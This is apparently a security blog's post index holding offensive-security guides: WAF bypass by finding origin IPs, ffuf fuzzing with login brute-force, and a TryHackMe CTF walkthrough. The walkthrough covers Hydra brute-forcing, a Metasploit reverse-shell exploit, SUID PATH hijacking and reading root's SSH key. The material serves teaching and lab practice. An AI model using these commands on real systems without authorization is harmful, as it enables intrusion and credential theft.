[
  
  {
    "title": "Discover the Origin IP Address of a Website and Identify WAF Protection",
    "url": "/posts/find-origin-ip-website",
    "categories": "Guides, Discover Origin IP Address of a Website and Identify WAF",
    "tags": "Guides, Origin IP, Identify WAF",
    "date": "2025-02-17 00:00:00 +0000",
    





    
    "snippet": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an ...",
    "content": "Web application firewalls (WAFs) and content delivery networks (CDNs) are commonly employed to enhance website security. These technologies often obscure the true IP address of a server, adding an additional layer of protection that can complicate security assessments and bug bounty testing. However, uncovering the source IP address allows you to bypass these layers and directly assess the server, potentially revealing vulnerabilities hidden by the WAF or CDN.This guide will explore methods for identifying whether a website is behind a WAF/CDN and techniques for discovering its origin IP address.Step 1: Identifying if a Website is Behind a WAF/CDNBefore attempting to find the origin IP, it’s crucial to confirm whether the website is protected by a WAF or CDN. Here are some methods to achieve this:1.1 Ping TestPerform a simple ping test to gather initial information about the IP address associated with the domain:ping target.comIf the IP resolves to a known CDN/WAF provider (e.g., Cloudflare, Amazon CloudFront, Akamai), it indicates the presence of such protection.1.2 Browser ExtensionsUse browser extensions like Wappalyzer to detect CDNs and WAFs. Simply visit the target website and check for any indicators of protection mechanisms.1.3 WafWOOF ToolWafWOOF is a specialized tool designed to identify WAFs. Run the following command:wafw00f https://target.comThis will reveal whether a WAF is in place and specify which one.1.4 WHOIS LookupA WHOIS lookup can provide insights into the hosting provider. If the registrar or hosting details point to a CDN/WAF vendor, it confirms their usage.Step 2: Methods for Discovering the Origin IP AddressOnce you’ve determined that a WAF/CDN is present, proceed with the following techniques to uncover the origin IP address:2.1 DNSReconDNSRecon performs reverse DNS lookups and may expose the origin IP if the server lacks robust WAF protection:dnsrecon -d target.com2.2 Shodan DorksLeverage Shodan’s search capabilities to locate leaked IPs:ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200For automated results, combine Shodan CLI with HTTPX:shodan search ssl.cert.subject.CN:\"&lt;DOMAIN&gt;\" 200 --fields ip_str | httpx-toolkit -sc -title -server -td2.3 CensysCensys is another powerful tool for IP discovery. Search for the target domain and review IPv4 entries matching SSL certificates or host details:https://search.censys.io/hosts?q=&lt;DOMAIN&gt;2.4 SecurityTrailsSecurityTrails offers historical DNS records, which can be invaluable for identifying past IP associations:https://securitytrails.com/domain/&lt;DOMAIN&gt;/history/a2.5 FOFAFOFA excels at finding specific server configurations. Use the favicon hash for refined results:https://fofa.info/Steps:  Extract the favicon URL from the website.  Generate its hash using tools like favicon-hash.  Search for the hash in FOFA.2.6 ZoomEyeSimilar to Shodan, ZoomEye indexes internet devices. Perform a domain search and filter results by favicon hash:https://www.zoomeye.org/searchResult?q=&lt;DOMAIN&gt;2.7 ViewDNS.infoViewDNS provides historical DNS records, including previous IP addresses:https://viewdns.info/iphistory/?domain=&lt;DOMAIN&gt;2.8 SPF RecordsSPF records list authorized sending IPs for email. While not always indicative of the web server, they can sometimes reveal relevant IPs:https://mxtoolbox.com/SuperTool.aspx?action=spf:&lt;DOMAIN&gt;2.9 VirusTotalVirusTotal aggregates data from multiple sources, making it useful for discovering subdomains and associated IPs:https://www.virustotal.com/gui/domain/&lt;DOMAIN&gt;/details2.10 AlienVault OTXAlienVault Open Threat Exchange (OTX) offers threat intelligence data, including IP mappings:https://otx.alienvault.com/indicator/hostname/&lt;DOMAIN&gt;2.11 Custom Bash ScriptCombine VirusTotal and AlienVault outputs into a single script for streamlined results:#!/bin/bash# API keys (replace with your own keys)VT_API_KEY=\"&lt;api_key&gt;\"OTX_API_KEY=\"&lt;api_key&gt;\"# Function to fetch IP addresses from VirusTotalfetch_vt_ips() {    local domain=$1    curl -s \"https://www.virustotal.com/vtapi/v2/domain/report?domain=$domain&amp;apikey=$VT_API_KEY\" \\        | jq -r '.. | .ip_address? // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Function to fetch IP addresses from AlienVaultfetch_otx_ips() {    local domain=$1    curl -s -H \"X-OTX-API-KEY: $OTX_API_KEY\" \"https://otx.alienvault.com/api/v1/indicators/hostname/$domain/url_list?limit=500&amp;page=1\" \\        | jq -r '.url_list[]?.result?.urlworker?.ip // empty' \\        | grep -Eo '([0-9]{1,3}\\.){3}[0-9]{1,3}'}# Check if domain is providedif [ -z \"$1\" ]; then    echo \"Usage: $0 &lt;domain_name_or_url&gt;\"    exit 1fiDOMAIN=$1OUTPUT_FILE=\"${DOMAIN}_ips.txt\"# Get IPs from both sources, remove duplicates, and save to fileecho \"Collecting IP addresses for: $DOMAIN\"{    fetch_vt_ips $DOMAIN    fetch_otx_ips $DOMAIN} | sort -u &gt; \"$OUTPUT_FILE\"echo \"IP addresses saved to: $OUTPUT_FILE\"Step 3: Verifying the Origin IPAfter identifying potential IPs, verify them through the following steps:3.1 /etc/hosts FileModify your /etc/hosts file to map the domain to the suspected IP:&lt;ORIGIN_IP&gt; target.comReload the browser and observe if the site loads correctly without WAF intervention.3.2 Nmap Certificate CheckUse Nmap to inspect the SSL certificate of the IP:nmap --script ssl-cert -p 443 &lt;ORIGIN_IP&gt;Ensure the certificate matches the target domain.3.3 Burp Suite TestingConfigure Burp Suite to route traffic through the discovered IP:  Set the upstream proxy to the origin IP.  Intercept requests and confirm responses originate from the backend server.Tips for Bug Bounty Hunters  Avoid Premature Reporting: Once you discover the origin IP, thoroughly explore it for vulnerabilities like SQL injection, XSS, or misconfigurations before submitting findings.  Test Without WAF: With direct access to the backend server, exploit testing becomes significantly easier due to the absence of WAF filtering.  Document Your Process: Maintain detailed records of your methodology and discoveries for transparency during reporting."
  },
  
  {
    "title": "FFUF: Fuzzing Guide to Web Applications",
    "url": "/posts/ffuf-Fuzzing-Guide",
    "categories": "Tools, FFUF Fuzzing Guide",
    "tags": "Tools, FFUF",
    "date": "2025-02-15 00:00:00 +0000",
    





    
    "snippet": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuz...",
    "content": "FFUF is a powerful, open-source fuzzing tool designed for web application security testing. It enables users to discover hidden files, directories, subdomains, and parameters through high-speed fuzzing. This guide will provide an in-depth explanation of FFUF commands, their use cases, and advanced techniques to help you leverage its full potential.Table of Contents  Installation  Basic Commands  Advanced Features  Output Options  Custom WordlistsInstallationTo install FFUF on your system, follow the instructions below:Debian/Ubuntu Based Systemssudo apt update &amp;&amp; sudo apt install ffufmacOS (Using Homebrew)brew install ffufOther Operating SystemsFor other operating systems, download the binary from the official GitHub repository:GitHub - ffuf: Fast web fuzzer written in GoOnce downloaded, extract the binary and add it to your system’s PATH.Basic CommandsDirectory and File Brute ForceOne of the most common uses of FFUF is finding hidden directories and files on a web server. Use the -u flag to specify the target URL and the -w flag to provide a wordlist.ffuf -u https://example.com/FUZZ -w wordlist.txtExplanation:  FUZZ: A placeholder that FFUF replaces with words from the wordlist.  wordlist.txt: A text file containing potential directory or file names.POST Request with WordlistTo fuzz POST requests, use the -X POST flag.ffuf -w wordlist.txt -u https://website.com/FUZZ -X POSTThis command sends POST requests while fuzzing the URL path.Case Insensitive MatchingUse the -ic flag for case-insensitive matching, which is useful when unsure about server case sensitivity.ffuf -u https://example.com/FUZZ -w wordlist.txt -ic -cThe -c flag adds color-coded output for better readability.File Extension FuzzingTo search for files with specific extensions, use the -e flag.ffuf -u https://example.com/indexFUZZ -w wordlist.txt -e .php,.asp,.bak,.dbThis command appends extensions like .php, .asp, .bak, and .db to each word in the wordlist.Recursive FuzzingFor multi-level directory fuzzing, use the -recursion flag.ffuf -u https://example.com/FUZZ -w wordlist.txt -recursion -recursion-depth 3This scans up to three levels deep, helping uncover deeply nested directories.Advanced FeaturesFiltering ResponsesFilter responses based on HTTP status codes or response sizes.ffuf -w wordlist.txt -u https://example.com/FUZZ -fc 404,500This excludes responses with status codes 404 or 500.Multi Wordlist FuzzingFuzz multiple parameters using separate wordlists.ffuf -u https://example.com/W2/W1/ -w dict.txt:W1 -w dns_dict.txt:W2Here, W1 and W2 are placeholders replaced by words from dict.txt and dns_dict.txt, respectively.Subdomain and Virtual Host FuzzingSubdomain FuzzingDiscover hidden subdomains by replacing the FUZZ keyword in the target URL.ffuf -w subdomains.txt -u https://FUZZ.example.com/Virtual Host (VHost) FuzzingFuzz the Host header to detect virtual hosts.ffuf -w vhosts.txt -u https://example.com/ -H \"Host: FUZZ.example.com\"Fuzzing HTTP ParametersGET Parameter FuzzingFind potential GET parameters by fuzzing the query string.ffuf -w wordlist.txt -u https://example.com/page.php?FUZZ=valuePOST Parameter FuzzingTest APIs or login forms by fuzzing POST data.ffuf -w wordlist.txt -u https://example.com/api -X POST -d 'FUZZ=value'Login Bypass TestingBrute force login systems by fuzzing the password parameter.ffuf -w passwordlist.txt -X POST -d \"username=admin&amp;password=FUZZ\" -u https://www.example.com/loginPUT Request FuzzingTest unauthorized file uploads or modifications.ffuf -w /path/to/wordlist.txt -X PUT -u https://target.com/FUZZ -b 'session=abcdef'Advanced FFUF TechniquesClusterbomb ModeCombine multiple wordlists for comprehensive testing.ffuf -request req.txt -request-proto http -mode clusterbomb -w usernames.txt:HFUZZ -w passwords.txt:WFUZZThis tests every combination of usernames and passwords.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode clusterbombPitchfork ModePair corresponding entries from two wordlists for controlled brute force testing.ffuf -w users.txt:USER -w passwords.txt:PASS -u https://example.com/login?username=USER&amp;password=PASS -mode pitchforkSetting CookiesInclude cookies in your requests for authenticated fuzzing.ffuf -b \"SESSIONID=abcd1234; USER=admin\" -w wordlist.txt -u https://example.com/FUZZUsing ProxiesRoute FFUF requests through a proxy like Burp Suite for deeper analysis.ffuf -x http://127.0.0.1:8080 -w wordlist.txt -u https://example.com/FUZZCustom Header FuzzingFuzz custom headers to identify vulnerabilities.ffuf -w headers.txt -u https://example.com/ -H \"X-Custom-Header: FUZZ\"Fuzzing with Custom User-AgentModify the User-Agent header to mimic specific browsers.ffuf -u \"https://example.com/FUZZ\" -w wordlist.txt -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"Rate Limiting BypassControl the request rate to avoid triggering rate limiting defenses.ffuf -w wordlist.txt -u https://example.com/FUZZ -rate 50 -t 50Output OptionsSave results in various formats for further analysis.HTML Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.html -of htmlJSON Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.json -of jsonCSV Outputffuf -w wordlist.txt -u https://example.com/FUZZ -o results.csv -of csvSave all output formats at once:ffuf -w wordlist.txt -u https://example.com/FUZZ -o results -of allCustom Wordlists with PayloadsAccess the wordlists with payloads here:  SecLists  PayloadsAllTheThings and PayloadsAllTheThings Website  PayloadBox"
  },
  
  {
    "title": "Browser Extensions for Cybersecurity",
    "url": "/posts/browser-extensions-cybersecurity",
    "categories": "Tools, Browser Extensions",
    "tags": "Tools, Browser Extensions",
    "date": "2025-02-13 00:00:00 +0000",
    





    
    "snippet": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gath...",
    "content": "For cybersecurity, browser extensions are essential tools that automate tasks, uncover vulnerabilities, and enhance privacy. This list highlights must-have extensions for testing applications, gathering intelligence, and improving your workflow. From detecting exposed credentials to managing proxies and analyzing metadata.Reconnaissance &amp; Information Gathering1. Wappalyzer — Technology DetectorWhy It’s Useful: Identifies the technology stack of websites, including frameworks, CMS, and server details.Link: Wappalyzer - Chrome Web Store2. Shodan — Website Intelligence ToolWhy It’s Useful: Provides information on website hosting, server locations, and open ports.Link: Shodan - Chrome Web Store3. Mitaka — OSINT Search ToolWhy It’s Useful: Searches IPs, domains, URLs, and hashes across multiple threat intelligence platforms.Link: Mitaka - Chrome Web Store4. Vortimo OSINT ToolWhy It’s Useful: A versatile tool for bookmarking, scraping, and analyzing web pages during OSINT investigations.Link: Vortimo OSINT Tool - Chrome Web Store5. Hunter.io — Finding Emails on WebsitesWhy It’s Useful: Extracts publicly available emails from websites for security reporting and OSINT investigations.Link: Hunter - Chrome Web Store6. WaybackURL — Fetch Archived URLsWhy It’s Useful: Retrieves all URLs from the Wayback Machine to identify past versions of web pages.Link: Wayback Machine - Chrome Web Store7. Traduzir Paginas Web — Webpage TranslatorWhy It’s Useful: Translates entire web pages into different languages for analyzing foreign websites.Link: Google Translate - Chrome Web Store8. EXIF Viewer Pro — Extract Image MetadataWhy It’s Useful: Retrieves metadata from images directly on a webpage for forensic analysis and OSINT investigations.Link: EXIF Viewer Pro - Chrome Web StoreTesting &amp; Exploitation9. HackTools — Payload GeneratorWhy It’s Useful: Provides pre-built payloads for SQLi, XSS, and other attacks to save time during manual testing.Link: Hack-Tools - Chrome Web Store10. EditThisCookie — Advanced Cookie EditorWhy It’s Useful: Allows modification, deletion, and analysis of cookies, including checking HTTPOnly and Secure flags.Link: EditThisCookie - Chrome Web Store11. D3coder — Encode/Decode ToolWhy It’s Useful: Encodes and decodes various text formats like Base64, URL encoding, and Unix timestamps.Link: D3coder - Chrome Web Store12. EndPointer — Find Sensitive URLsWhy It’s Useful: Extracts and analyzes URLs for potential security endpoints during penetration testing.Link: EndPointer - Chrome Web Store13. Link Gopher — Extract All LinksWhy It’s Useful: Fetches all links from a webpage for reconnaissance purposes.Link: Link Gopher - Chrome Web Store14. FindSomething — Hidden Parameter FinderWhy It’s Useful: Scans source code and JavaScript files for interesting patterns and hidden data, such as API keys.Link: FindSomething - Chrome Web Store15. .git Finder — Information DisclosureWhy It’s Useful: Detects exposed .git directories that may lead to source code leaks.Link: .git Finder - Chrome Web Store16. S3BucketList — AWS Bucket FinderWhy It’s Useful: Searches for publicly accessible AWS S3 buckets to detect misconfigured cloud storage.Link: S3BucketList - Chrome Web StoreAutomation &amp; Efficiency17. FoxyProxy — Proxy Management for Burp SuiteWhy It’s Useful: Simplifies proxy management for intercepting web traffic with tools like Burp Suite or OWASP ZAP.Link: FoxyProxy - Chrome Web Store18. Open Multiple URLs — Bulk URL OpenerWhy It’s Useful: Opens multiple links simultaneously, saving time during bug hunting.Link: Open Multiple URLs - Chrome Web Store19. YesWeHack VDP FinderWhy It’s Useful: Detects vulnerability disclosure programs (VDP) of visited websites for responsible reporting.Link: YesWeHack VDP Finder - Chrome Web Store20. SponsorBlock — Skip YouTube SponsorsWhy It’s Useful: Skips sponsored segments, intros, and outros on YouTube videos to save time.Link: SponsorBlock - Chrome Web StorePrivacy &amp; Security21. uBlock Origin — Ad and Tracker BlockerWhy It’s Useful: Blocks ads, trackers, and malicious scripts to improve privacy and security.Link: uBlock Origin - Chrome Web Store22. WebRTC Protect — Protect IP LeakWhy It’s Useful: Disables WebRTC to prevent IP address leakage, ensuring anonymity while browsing.Link: WebRTC Protect - Chrome Web Store23. Temp-Mail — Disposable Email ServiceWhy It’s Useful: Provides temporary email addresses to avoid spam and protect your personal information.Link: Temp Mail - Chrome Web Store24. Dark Reader — Eye ProtectionWhy It’s Useful: Provides a dark mode for all websites to reduce eye strain during late-night sessions.Link: Dark Reader - Chrome Web Store"
  },
  
  {
    "title": "THM: Lookup",
    "url": "/posts/ctf-redteam-lookup",
    "categories": "CTF, Red Team",
    "tags": "CTF, Red Team",
    "date": "2025-02-12 00:00:00 +0000",
    





    
    "snippet": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover...",
    "content": "WalkthroughCTF Platform: TryHackMeLevel: EasyTools Used:  Nmap: For scanning the target network to identify open ports and services.  Gobuster: For enumerating subdomains and directories to uncover hidden resources.  Hydra: For brute-forcing login credentials.  Metasploit: For exploiting the elFinder command injection vulnerability.  Python: For spawning an interactive shell.  Linpeas: For automating enumeration and identifying privilege escalation vectors.Resources Used:  GTFOBins: A repository of Unix binaries that can be exploited for privilege escalation.  SecLists: A collection of wordlists used for brute-forcing credentials with Hydra.  Exploit DB: An alternative resource for finding exploits, such as the one used for elFinder.Step 1: Scanning the Target NetworkWe begin by scanning the target machine 10.10.41.18 using Nmap to identify open ports and services.Command:nmap 10.10.41.18 -sV -sCOutput:Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-05 17:27 ISTNmap scan report for lookup.thm (10.10.41.18)Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))Observations:  Port 22 (SSH): Running OpenSSH 8.2p1.  Port 80 (HTTP): Running Apache HTTP Server 2.4.41.Step 2: Discovering Subdomains with GobusterTo find any hidden subdomains or directories, we use Gobuster:Command:gobuster dns -d lookup.thm -w /usr/share/wordlists/dirb/common.txtOutput:===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     lookup.thm[+] Method:                  DNS[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirb/common.txt[+] Timeout:                 10s===============================================================2025/01/05 18:00:00 Starting gobuster in DNS subdomain enumeration mode===============================================================files.lookup.thm (Status: FOUND)...Key Concept:  Gobuster: A tool for discovering subdomains, directories, and files on a web server. In this case, we used it to uncover the files.lookup.thm subdomain.Step 3: Adding Target to Hosts FileFor easier navigation, we add the target’s IP to the /etc/hosts file.Commands:echo \"10.10.41.18 lookup.thm\" | sudo tee -a /etc/hostsecho \"10.10.41.18 files.lookup.thm\" | sudo tee -a /etc/hostsStep 4: Navigating to the Web ApplicationAfter updating the hosts file, we open the web application in a browser. The login page appears.Attempting Default Credentials:We attempt to log in with common default credentials but are met with a “wrong password” message and a 3-second delay before redirection.Key Concept:  Brute Force Protection: The delay is likely implemented to prevent brute-force attacks.Step 5: Brute Forcing Login Using HydraSince default credentials didn’t work, we proceed with brute-forcing the login page using Hydra.Command:hydra -L /snap/seclists/current/Usernames/Names/names.txt -p password123 lookup.thm http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=try again\"Output:[80][http-post-form] host: lookup.thm   login: jose   password: password123Key Concept:  Hydra: A powerful tool for brute-forcing login forms. It automates the process of trying multiple username-password combinations.Step 6: Logging InUsing the discovered credentials (jose:password123), we log into the system. After logging in, we are redirected to the files.lookup.thm domain.Step 7: Exploring the credential.txt FileUpon opening the credential.txt file, we find some credentials that might be for SSH. However, attempting to use these credentials fails:Command:ssh think@10.10.41.18Output:think@10.10.41.18's password:Permission denied, please try again.Step 8: Identifying VulnerabilitiesWhile interacting with the system, we discover a vulnerable web application called elFinder running on the target machine.Version Discovery:By inspecting the web interface, we determine the version of elFinder (2.1.47).Searching for Exploits:We search for exploits related to this version in Metasploit and Exploit DB:Commands:msfconsole -qsearch elfinder 2.1.47Output:Matching Modules================    #  Name                                                               Disclosure Date  Rank       Check  Description   -  ----                                                                ---------------  ----       -----  -----------   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command InjectionKey Concept:  Metasploit: A framework for developing and executing exploit code against remote targets.  Exploit DB: A database of public exploits and shellcode. You could have searched for the vulnerability here as well.Step 9: Exploiting the elFinder VulnerabilityWe select and configure the exploit module for elFinder:Commands:use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injectionset LHOST tun0set RHOST files.lookup.thmrunOutput:[*] Started reverse TCP handler on 10.17.14.127:4444 [*] Uploading payload 'TRNyzgLuCE.jpg;echo ...' (1975 bytes)[*] Triggering vulnerability via image rotation ...[*] Executing payload (/elFinder/php/.7mrFCOx.php) ...[*] Sending stage (40004 bytes) to 10.10.41.18[+] Deleted .7mrFCOx.php[*] Meterpreter session 1 opened (10.17.14.127:4444 -&gt; 10.10.41.18:35566)Key Concept:  Command Injection: The vulnerability allows us to inject commands into the application, which are then executed by the server.Step 10: Spawning a ShellOnce inside the system, we have a limited shell as the www-data user. To make it more interactive, we spawn a proper shell using Python:Command:python3 -c 'import pty; pty.spawn(\"/bin/bash\")'Key Concept:  PTY Shell: A pseudo-terminal provides a fully interactive shell, allowing us to execute complex commands and navigate the system effectively.At this point, we could have used linpeas to automate the enumeration process and check for every privilege escalation possibility:Steps:  Upload linpeas.sh to the target machine.  Execute it with the following command:    ./linpeas.sh        Linpeas would have highlighted potential privilege escalation vectors, such as misconfigured SUID binaries or weak file permissions.Step 11: Privilege EscalationAs the www-data user, we check for potential privilege escalation opportunities.Checking SUID Binaries:We search for binaries with the SUID bit set:Command:find / -perm /4000 2&gt;/dev/nullOutput:/usr/sbin/pwmKey Concept:  SUID Bit: Files with the SUID bit set allow users to execute them with the file owner’s privileges.Exploiting the pwm Binary:We manipulate the PATH variable to exploit the pwm binary:Commands:export PATH=/tmp:$PATHecho -e '#!/bin/bash\\n echo \"uid=33(think) gid=33(think) groups=33(think)\"' &gt; /tmp/idchmod +x /tmp/id/usr/sbin/pwmThis changes the user to think.Step 12: SSH Brute-ForcingWe perform an SSH brute-force attack using Hydra to gain access as the think user:Command:hydra -l think -P wordlist.txt ssh://lookup.thmOutput:think:josemario.AKA(think)Logging In:ssh think@lookup.thmRetrieving User Flag:cat /home/think/user.txt{REDACTED}Step 13: Privilege Escalation to RootAs the think user, we check for sudo privileges:Command:sudo -lOutput:User think may run the following commands on lookup:(ALL) /usr/bin/lookExploiting the look Command:Using GTFOBins, we find a method to read sensitive files with the look command:Command:LFILE=/root/.ssh/id_rsasudo look '' \"$LFILE\"This grants us the root user’s private SSH key.Logging In as Root:ssh -i /tmp/id_rsa root@lookup.thmRetrieving Root Flag:cat /root/root.txt{REDACTED}"
  },
  
  {
    "title": "Honeypot Suite",
    "url": "/posts/python-honeypot-suite",
    "categories": "Python, Honeypot Suite",
    "tags": "Python, Honeypot Suite",
    "date": "2025-02-09 00:00:00 +0000",
    





    
    "snippet": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup,...",
    "content": "The entire honeypot suite, including all protocol-specific implementations and the centralized management script (menu.py), is hosted in a single repository. This unified approach simplifies setup, maintenance, and contribution.Honeypot Suite Repository  Link: Honeypot Suite RepositoryDirectory StructureThe repository follows a modular structure for clarity and extensibility:honeypot-suite/├── https_honeypot.py       # HTTPS honeypot implementation├── dns_honeypot.py         # DNS honeypot implementation├── ssh_honeypot.py         # SSH honeypot implementation├── ftp_honeypot.py         # FTP honeypot implementation├── postgresql_honeypot.py  # PostgreSQL honeypot implementation├── menu.py                 # Centralized GUI for managing honeypots└──  README.md               # Project documentationFeaturesThe honeypot suite is designed to simulate various network services, allowing you to monitor and analyze malicious activities. Key features include:  Multi-Protocol Support: Supports HTTPS, DNS, SSH, FTP, and PostgreSQL protocols.  Dynamic Configuration: Allows users to configure host, port, and protocol-specific settings via a GUI or command-line interface.  Real-Time Logging: Logs all interactions with the honeypot in real-time, providing detailed insights into attacker behavior.  Customizable Responses: Each honeypot can be configured to respond with custom data (e.g., fake IP addresses for DNS, dummy responses for SSH).  Self-Signed Certificates: Automatically generates SSL/TLS certificates for HTTPS and SSH honeypots.  Cross-Platform Compatibility: Works on Windows, macOS, and Linux.How It WorksThe honeypot suite operates by mimicking vulnerable network services to attract attackers and log their interactions. Here’s an overview of how it works:  Service Simulation:          Each honeypot module simulates a specific protocol (e.g., DNS, SSH) and listens for incoming connections.      The honeypot responds to queries or login attempts with predefined or dynamically generated data.        Logging:          All interactions are logged to files (e.g., dns_honeypot.log, ssh_honeypot.log) for later analysis.      Logs include details such as source IP, port, query type, username/password attempts, and more.        GUI Management:          A professional GUI (menu.py) allows users to select, configure, and manage honeypots easily.      Start/stop buttons ensure seamless control over each service.        Termination:          Closing the Python program stops the honeypot service.      Ensure proper termination using tips provided below.      Code StructureThe honeypot suite is modular and extensible, with each protocol implemented as a separate Python script. Below is the high-level structure:  Honeypot Modules:          Each protocol has its own script (e.g., https_honeypot.py, dns_honeypot.py).      Scripts expose start_honeypot and stop_honeypot functions for integration.        Centralized Control:          The menu.py script provides a unified interface for managing all honeypots.      Dynamically loads modules based on user selection.        Twisted Framework:          Built using Twisted, a powerful event-driven networking engine for Python.      Ensures efficient handling of network traffic and logging.        Cryptography Library:          Uses the cryptography library to generate self-signed certificates for HTTPS and SSH.      InterfaceMenuThe menu.py script provides a clean and intuitive GUI for selecting and configuring honeypots:Steps to Use the Menu:  Select a protocol (e.g., DNS, SSH).  Configure settings such as host, port, and additional parameters (e.g., SSH version).  Click “Start Honeypot” to begin monitoring.  View logs in real-time within the GUI.LimitationsWhile the honeypot suite is robust, it has some limitations:  Resource Consumption: Running multiple honeypots simultaneously may consume significant system resources.  False Positives: Legitimate users interacting with the honeypot may generate logs that need filtering.  Single Process Reactor: Only one Twisted reactor can run at a time, limiting simultaneous honeypot execution without subprocesses.  Basic Simulations: The honeypots provide basic simulations and may not fully replicate complex production environments.Future EnhancementsPlanned enhancements include:  Advanced Logging: Integrate with centralized logging systems like Elasticsearch or Splunk for better analysis.  Machine Learning: Use ML models to detect and classify attack patterns automatically.  Containerization: Package each honeypot in Docker containers for easier deployment and isolation.  Web-Based Interface: Replace the Tkinter GUI with a web-based dashboard for remote management.  Automated Alerts: Send email or SMS alerts when suspicious activity is detected.Ethical ConsiderationsUsing honeypots for cybersecurity research must adhere to ethical guidelines:  Authorization: Deploy honeypots only in environments where you have explicit permission.  Data Privacy: Avoid logging sensitive information from legitimate users.  Legal Compliance: Ensure compliance with local laws and regulations regarding data collection and monitoring.  Isolation: Run honeypots in isolated networks to prevent unintended exposure.Tips and TricksEnsuring Proper TerminationTo ensure the honeypot stops cleanly:  Graceful Shutdown:          Press Ctrl+C in the terminal running the honeypot.      Verify termination using tools like netstat or tasklist.        Example:    netstat -ano | findstr :&lt;port&gt;taskkill /PID &lt;PID&gt; /F        Check Logs:          Review the log file (e.g., dns_honeypot.log) to confirm the honeypot stopped successfully.      Setting Up the HTTPS Honeypot  Download Resources:          Specify a target URL (e.g., https://example.com) to download and serve content.      The honeypot inlines CSS, JavaScript, and images to reduce external dependencies.        Generate Certificates:          Customize SSL certificate details (e.g., country, organization) during startup.      Certificates are stored locally in the script directory.        Run the Honeypot:          Execute the script with desired configurations:        python https_honeypot.py --host 0.0.0.0 --port 443 --url https://example.com                      Test Locally:          Use tools like curl or Postman to test the honeypot:        curl -k https://127.0.0.1/                    Extra InsightsWhy Use Honeypots?Honeypots are invaluable tools for:  Gathering intelligence on attacker techniques and tools.  Detecting and mitigating threats in real-time.  Educating teams about security risks through practical demonstrations.Best Practices  Regular Updates: Keep the honeypot scripts updated to handle new attack vectors.  Controlled Environment: Deploy honeypots in sandboxed or virtualized environments to minimize risks.  Analyze Logs: Regularly review logs to identify trends and improve your security posture.Example OutputBelow is an example log entry from the DNS honeypot:[2023-10-15 12:34:56] DNS Query Received - Query Name: example.com, Type: A, Class: IN, From: ('192.168.1.100', 5353)From the SSH honeypot:[2023-10-15 12:35:00] Login attempt - Username: admin, Password: password123ConclusionThis honeypot suite is a tool for cybersecurity researchers. By simulating vulnerable services, it helps you understand attacker behavior and strengthen your defenses. While the current implementation focuses on simplicity and usability, future enhancements will expand its capabilities and make it even more effective."
  },
  
  {
    "title": "Network Scanner",
    "url": "/posts/python-network-scanner",
    "categories": "Python, Network Scanner",
    "tags": "Python, Network Scanner",
    "date": "2025-02-07 00:00:00 +0000",
    





    
    "snippet": "Network scanning tool designed for cybersecurity. It offers features such as port scanning, service detection, OS fingerprinting, vulnerability scanning, traceroute, geolocation, WHOIS lookup, and ...",
    "content": "Network scanning tool designed for cybersecurity. It offers features such as port scanning, service detection, OS fingerprinting, vulnerability scanning, traceroute, geolocation, WHOIS lookup, and SSL/TLS checks. By querying external databases like Shodan, NVD, and CIRCL, the tool identifies potential vulnerabilities and generates detailed HTML reports summarizing scan results.Network Scanner Repository  Link: Network Scanner RepositoryFeatures  Port Scanning: Scan both TCP and UDP ports to identify open, closed, or filtered ports.  Service Detection: Detect service versions running on open ports.  OS Fingerprinting: Perform advanced OS fingerprinting to guess the operating system of the target.  Vulnerability Scanning: Query external databases (Shodan, NVD, CIRCL) to identify potential vulnerabilities.  Traceroute: Perform a traceroute to the target IP to identify the network path.  Geolocation: Determine the geographical location of the target IP using the GeoIP database.  WHOIS Lookup: Retrieve WHOIS information for the target domain or IP.  SSL/TLS Check: Check SSL/TLS configurations for HTTPS services.  NSLookup: Perform DNS resolution to convert IP addresses to domain names and vice versa.  HTML Report Generation: Generate a detailed HTML report summarizing the scan results.  Website Vulnerability Check: Query CVE Details for known vulnerabilities associated with the target domain.How It WorksThe program starts by displaying a banner and prompting the user for a target IP address and a port range. It then proceeds to scan the specified ports using TCP or UDP protocols. For each open port, the program attempts to detect the service version and suggest potential vulnerabilities. It also performs additional tasks like OS fingerprinting, traceroute, geolocation, WHOIS lookup, and SSL/TLS checks. Finally, it compiles all the gathered information into an HTML report.Code StructureThe code is structured into several functions, each responsible for a specific task:  scan_tcp_port: Scans a TCP port and determines if it is open, closed, or filtered.  scan_udp_port: Scans a UDP port and determines if it is open, closed, or filtered.  nslookup: Performs DNS resolution for the target IP or domain.  query_website_vulnerabilities: Queries CVE Details for known vulnerabilities associated with the target domain.  generate_html_report: Generates an HTML report summarizing the scan results.  detect_service_version: Detects the service version running on an open port.  suggest_exploits: Suggests potential exploits for the detected service.  os_fingerprinting: Performs OS fingerprinting to guess the operating system of the target.  query_shodan: Queries Shodan for information about the target IP.  query_nvd: Queries the National Vulnerability Database (NVD) for known vulnerabilities.  query_circl: Queries CIRCL 